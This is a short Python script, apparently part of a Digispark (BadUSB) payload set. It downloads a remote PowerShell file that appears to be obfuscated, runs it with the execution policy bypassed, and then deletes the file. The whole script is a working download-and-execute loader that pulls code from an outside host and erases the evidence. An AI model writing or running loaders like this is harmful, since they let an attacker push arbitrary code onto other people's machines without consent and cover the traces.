import os
import tempfile
import subprocess
import urllib.request

# Step 1: Download PS1 to temp
ps1_url = "https://raw.githubusercontent.com/huh445/Digispark-Scripts/main/ChangeBackgroundObf.ps1"  # 👈 Replace with actual URL
temp_dir = tempfile.gettempdir()
ps1_path = os.path.join(temp_dir, "bgchange.ps1")

urllib.request.urlretrieve(ps1_url, ps1_path)

# Step 2: Run the PowerShell script
subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", ps1_path], shell=True)

# Step 3: Optional - Delete script after execution
os.remove(ps1_path)